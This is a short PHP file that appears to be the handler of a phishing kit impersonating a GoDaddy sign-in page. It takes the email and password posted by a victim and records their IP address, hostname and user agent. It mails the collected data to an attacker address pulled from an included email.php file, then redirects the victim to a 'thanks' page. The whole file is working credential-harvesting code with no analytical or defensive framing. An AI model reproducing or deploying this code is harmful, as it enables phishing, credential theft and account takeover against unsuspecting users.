<?php
if($_POST["ud"] != "" and $_POST["pd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------GoDaddy Info-----------------------\n";
$message .= "Email             : ".$_POST['ud']."\n";
$message .= "Password           : ".$_POST['pd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: thanks.php");
}else{
header ("Location: index.php");
}

?>